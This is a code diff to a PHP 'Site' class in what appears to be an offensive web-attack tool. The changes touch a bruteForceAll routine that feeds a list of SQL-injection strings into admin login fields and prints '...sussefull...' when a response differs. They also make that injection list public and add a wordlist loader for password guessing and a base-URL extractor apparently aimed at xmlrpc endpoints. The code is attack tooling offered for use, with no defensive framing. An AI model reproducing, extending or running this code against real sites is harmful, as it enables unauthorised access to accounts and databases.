@@ -32,6 +32,7 @@ class Site{
 				[
 					"proxy"=> $this->proxy,
 					'headers' => ['User-Agent' => $this->header->getUserAgent()],
+					'timeout' => 30,
 				])->getBody()->getContents();
 		}catch(\Exception $e){
 			echo $e->getCode()." - page not Found;";
@@ -124,15 +125,14 @@ class Site{
 	public function bruteForceAll($action,$method,$username,$password,$otherFields=array())
 	{
 		//$proxySiteList=new ProxySiteList();
-		//echo "\n".$password;
+		//echo "\n".$username." -> ".$password;
 		$listForInjection=$this->listOfInjectionAdmin();
 		$pageControl="";
 		$sqlInjection=false;
 		$count0=0;
 		foreach($listForInjection as $keyInjetion=> $injetion)
 		{
-			echo $injetion;
-			echo "\n";
+			echo ".";
 			$username[key($username)]=$injetion;
 			$password[key($password)]=$injetion;
 			array(
@@ -205,7 +205,7 @@ class Site{
 
 			if((isset($body) AND $pageControl!=$body) OR $sqlInjection)
 			{
-				echo "...sussefull...\n";
+				echo "\n...sussefull...\n";
 				$resultData['username']=$injetion;
 				$resultData['password']=$injetion;
 				if($sqlInjection){
@@ -222,7 +222,7 @@ class Site{
 		return;
 	}
 
-	private function listOfInjectionAdmin()
+	public function listOfInjectionAdmin()
 	{
 		$injection[]="zzaa44";
 		$injection[]="admin";
@@ -442,6 +442,38 @@ class Site{
 		return false;
 	}
 
+	public function getWordListInArray($wordlist=""){
 
-	
+		if(empty($wordlist)){
+			/*$zip = new \ZipArchive;
+			$zip->open('resource/wordlist.zip');
+			$zip->extractTo('resource/tmp/');
+			$zip->close();*/
+			$wordlist    = __DIR__.'/../resource/litleWordListPt.txt';
+			$arrWordlist = file($wordlist,FILE_IGNORE_NEW_LINES);
+			//unlink($wordlist);
+			return $arrWordlist;
+		}
+
+		$checkFileWordList  = v::file()->notEmpty()->validate($wordlist);
+		if($checkFileWordList){
+			$targetResult   = file($wordlist,FILE_IGNORE_NEW_LINES);
+			return $targetResult;
+		}
+
+		return false;
+
+	}
+
+	public function getBaseUrByUrl()
+	{
+		$validXmlrpc = preg_match("/^.+?[^\/:](?=[?\/]|$)/",$this->target,$m,PREG_OFFSET_CAPTURE);
+
+		if ($validXmlrpc) {
+
+			return $m[0][0];
+
+		}
+		return;
+	}
 }
